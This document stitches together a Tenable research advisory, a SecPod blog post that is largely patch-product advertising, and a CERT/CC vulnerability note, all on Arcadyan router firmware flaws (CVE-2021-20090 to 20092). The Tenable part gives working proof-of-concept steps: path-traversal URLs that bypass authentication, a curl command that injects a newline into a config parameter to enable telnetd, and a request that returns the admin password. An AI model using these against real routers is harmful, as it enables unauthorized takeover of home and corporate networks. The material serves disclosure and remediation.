High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable has discovered multiple vulnerabilities in routers manufactured by Arcadyan.

During the disclosure process for the issues discovered in the Buffalo routers, Tenable discovered that CVE-2021-20090 affected many more devices, as the root cause of the vulnerability exists in the underlying Arcadyan firmware.

Please note that CVE-2021-20091 and CVE-2021-20092 have only been confirmed on Buffalo WSR-2533 models.

**CVE-2021-20090****: Path Traversal**

| `Vodafone` | `EasyBox 802` | `20.02.226` |

**Proof of Concept:**

The vulnerability exists due to a list of folders which fall under a "bypass list" for authentication. For most of the devices listed, that means that the vulnerability can be triggered by multiple paths. The simplest examples would be:

For a device in which **http://<ip>/index.htm** requires authentication, an attacker could access **index.htm** using the following paths:

* **http://<ip>/images/..%2findex.htm**
* **http://<ip>/js/..%2findex.htm**
* **http://<ip>/css/..%2findex.htm**

To have the pages load properly, one will need to use proxy match/replace settings to ensure any resources loaded which require authentication also leverage the path traversal. Additionally, certain files (those found under /cgi/) require a csrf (named **httoken** on these devices) token and a valid **Referer** header which will cause an error if the referer includes the **..%2f** traversal (which can be match/replaced as well).

**CVE-2021-20091** : **Configuration File Injection**
**CVSSv3 Base Score:**7.5
**CVSSv3 Vector:**AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
The web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 do not properly sanitize user input. An authenticated remote attacker could leverage this vulnerability to alter device configuration, potentially gaining remote code execution.**Proof of Concept:**
The injection occurs in parameters which pass from **apply\_abstract.cgi** to the device's global config file. Assuming the user is logged in (or, alternatively, the url can be changed to /images/..%2fapply\_abstract.cgi, leveraging the path traversal), the following command could be used to inject a line into the configuration file which enables **telnetd**.
```
curl --include -X POST http://<ip>/apply_abstract.cgi -H "Referer: http://<ip>/ping.html" --data "action=start_ping&httoken=<valid httoken>&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=<ip>%0AARC_SYS_TelnetdEnable=1&ARC_ping_status=0&TMP_Ping_Type=4"
```
The **%0A** will be interpreted as a newline when the ping address is added to /tmp/etc/config/.glbcfg. When rebooted, a shell will be available on port 23.CVE-2021-20092 : **Improper Access Control**
**CVSSv3 Base Score:**5.9
**CVSSv3 Vector:**AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
The web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 do not properly restrict access to sensitive information from an unauthorized actor.

**Proof of Concept:**

1. To get a valid httoken, navigate to http://<ip of device>/loginerror.html in a modern browser (tested on chrome).
2. Open DevTools
3. Run getToken() in the Console.
4. Copy the token, and use it in the following command from a terminal:

```
$ curl --include "http://192.168.11.1/cgi/cgi_i_filter.js?_tn=442853667" -H "Referer: http://192.168.11.1/loginerror.html"

HTTP/1.1 200 OK
Date: Mon, 13 Jan 2020 15:24:03 GMT
Server: Arcadyan httpd 1.0
Content-type: application/x-javascript
X-FRAME-OPTIONS: SAMEORIGIN
Connection: close

/*DEMO*/
var login_password = “<admin password>“;

addCfg("lan_ipaddr", 0, "192.168.11.1");

```

# Arcadyan-Based Routers and Modems Under Active Exploitation

* Post author:[Rinu K](https://www.secpod.com/blog/author/krinu/ "Posts by Rinu K")
* Post published:August 9, 2021
* Reading time:4 mins read

Millions of routers are exposed to a security flaw that existed for a decade in home routers with **Arcadyan firmware**. This **actively exploited** flaw tracked under CVE identifier **CVE-2021-20090** has found its way into routers provided by at least **20 models** across **17 different vendors** and **11 countries**. A [patch management tool](https://www.secpod.com/patch-management/) can remediate this vulnerability. Devices from multiple vendors and ISPs, including Asus, British Telecom, Deutsche Telekom, Orange, O2 (Telefonica), Verizon, Vodafone, Telstra, and Telus, are there in that list. The discovered **13 Internet Service Providers** (ISPs) are used in Argentina, the U.S., Australia, Canada, Germany, Japan, New Zealand, Mexico, Netherlands, Russia, and Spain.

Tenable discovered a critical path traversal vulnerability. When exploited, this vulnerability enables attackers to bypass authentication to the web interface of routers, granting them access to other devices on a home or corporate network and observing that threat actors are actively exploiting this vulnerability from Wuhan, Hubei province, China. These attackers are using malicious tools to **deploy a Mirai botnet variant**. Having a [vulnerability management software](https://www.secpod.com/vulnerability-management/) is essential here.

---

## **Vulnerability Details ([CVE-2021-20090](https://www.scaprepo.com/view.jsp?id=CVE-2021-20090))**

The **path traversal vulnerability** exists due to improper access permission set for a list of folders and files. It will allow unauthenticated users to access sensitive information. Attackers can use the ‘valid httoken’ obtained in further requests to retrieve sensitive information, such as the ‘admin’ password.

---

## **Affected Applications**

Security researchers have found that Arcadyan firmware, used in routers from multiple vendors, is vulnerable. Below is the attached list of affected devices from different vendors:

Attached below are a screenshot of an HTTP request and response on a vulnerable router allowing access to a page that restricts authenticated users:

Another two vulnerabilities affecting **Buffalo WSR-2533** models are tracked under CVE identifiers [**CVE-2021-20091**](https://www.scaprepo.com/view.jsp?id=CVE-2021-20091) and [**CVE-2021-20092**](https://www.scaprepo.com/view.jsp?id=CVE-2021-20092).

## **Vulnerability Details ([CVE-2021-20091](https://www.scaprepo.com/view.jsp?id=CVE-2021-20091))**

The **remote code execution vulnerabilit**y exists due to improper validation of user-supplied input by the web interface of the Buffalo router. Attackers can inject a crafted parameter from ‘apply\_abstract.cgi’ into the device’s global config file, allowing them to insert a new line into the configuration file and enable telnetd.

---

## **Vulnerability Details ([CVE-2021-20092](https://www.scaprepo.com/view.jsp?id=CVE-2021-20092))**

The **information disclosure vulnerability** exists due to improper access control. An unauthorized actor can get a valid token by navigating to the ‘loginerror.html’ page. Attackers can use the ‘valid httoken’ obtained in further requests to retrieve sensitive information, such as the ‘admin’ password.

---

## **Affected Applications**

Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24

---

## **Solutions**

We strongly recommend updating the router to the latest available Arcadyan firmware version.

### Take Patch Management Miles Ahead with the Industry Leading Patching Capabilities

 Automate Patching for Faster Deployment

Manual patching cycles are tedious and time-consuming. With the SanerNow automated patch management tool, configure end-to-end workflows for automatic patching and fix risks faster than ever. Schedule automated patching tasks and make patching a hands-free task. It also supports the upload of pre and post-remediation scripts.

 Test and Approve Patches for Zero-Disruption

Applying new patches directly to the production environment is risky. SanerNow patch management software enables you to create a test environment to test the new patches to verify compatibility. Later, deploy the approved patches across the devices in your production environment and prevent any disruptions and productivity errors.

 Perimeter-Less Patching with a Single, light-weight Agent

SanerNow auto patching software is an ideal solution for hybrid workforces. You can easily deploy patches across globally distributed devices from a centralized cloud patch management solution. Furthermore, all the patching tasks, from scanning to deployment, are executed by a single lightweight multifunctional agent installed in the endpoints. You can also go for the agent-less option, which is a unique approach to scanning while retaining the scan speed and accuracy.

 Risk based Prioritization to Deploy Patches Smartly

SanerNow auto patching tool thoroughly assesses the patches and prioritizes them based on their business context, technical impact, severity level, and more intelligence to help focus on critical patches immediately. Additionally, you can deploy these patches quickly to reduce risk exposure and plan your remediation efforts wisely.

 Firmware Patches for Complete Risk Mitigation

As important as the software application patches, firmware patches are critical to tightening IT security. Moreover, it is recommended to include firmware patching as you establish your automated patch management cadence to reduce security risk exposure. SanerNow patch manager supports patching for firmware updates to fix issues and errors in firmware.

 Continuous and Customizable Patch Scans to Identify Missing Patches

Move away from the periodic scans and make it a continuous process with SanerNow patch management software. Keep your patching up-to-date with customized, real-time, and continuous scans for verified patches based on your IT environment. You can additionally perform real-time, on-demand, scheduled, and automated patch scans with the SanerNow patch management tool.

 Cross-Platform Patching with Support for Third-Party Apps

SanerNow patch management tool supports multi-platform patching for all major operating systems like Windows, macOS, Linux, and 550+ third-party applications. SanerNow’s automated patching solution additionally maintains a pre-built patch repository for third-party application patches.

 Effortless Patch Rollback for an Error-Prone Patching

Patch rollback is made easier with the SanerNow automated patch management tool to avoid disruptions in business operations. It rollbacks the last stable version with zero downtime and a single click to easily deal with incompatible and error-prone software patches.

 Comply with Industry Benchmarks and Security Standards

Various industry regulatory standards and organizations mandate patch compliance. SanerNow auto patch management software provides a unified view of your software patch compliance to address deviations from compliance standards and deploy patches accordingly. However, with auto patching in SanerNow, you can quickly fix the misconfigurations and achieve compliance with regulatory standards.

 Insights and Tracking with Reports and Audit Logs

Track detailed insights on your patching metrics with auto-generated reports and an inbuilt audit log. SanerNow automated patch management software provides a wide range of reports to assess the patching status in your network. Additionally, SanerNow provides an insightful Patch Impact Report to analyze the impact of patches and track the patching activities.

![](https://www.secpod.com/wp-content/uploads/2024/06/Asset-12@4x-8-1024x954-3.webp)

*“SanerNow’s patch management capabilities stand out from the competition since it can patch all the discovered vulnerabilities and perform other system-hardening actions. Even if no direct remediation is available, SanerNow applies security controls that provide workarounds for the* *vulnerabilities.”*

**– Swetha Krishnamoorthi, Senior Industry Analyst, Cybersecurity, Frost & Sullivan**

## Arcadyan-based routers and modems vulnerable to authentication bypass

#### Vulnerability Note VU#914124

Original Release Date: 2021-07-20 | Last Revised: 2021-10-07

---

### Overview

A path traversal vulnerability exists in numerous routers manufactured by multiple vendors using Arcadyan based software. This vulnerability allows an unauthenticated user access to sensitive information and allows for the alteration of the router configuration.

### Description

The vulnerability, identified as [CVE-2021-20090](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20090), is a path traversal vulnerability. An unauthenticated attacker is able to leverage this vulnerability to access resources that would normally be protected. The researcher initially thought it was limited to one router manufacturer and published their [findings](https://www.tenable.com/security/research/tra-2021-13), but then discovered that the issue existed in the Arcadyan based software that was being used in routers from multiple vendors.

### Impact

Successful exploitation of this vulnerability could allow an attacker to access pages that would otherwise require authentication. An unauthenticated attacker could gain access to sensitive information, including valid request tokens, which could be used to make requests to alter router settings.

### Solution

The CERT/CC recommends updating your router to the latest available firmware version. It is also recommended to disable the remote (WAN-side) administration services on any SoHo router and also disable the web interface on the WAN.
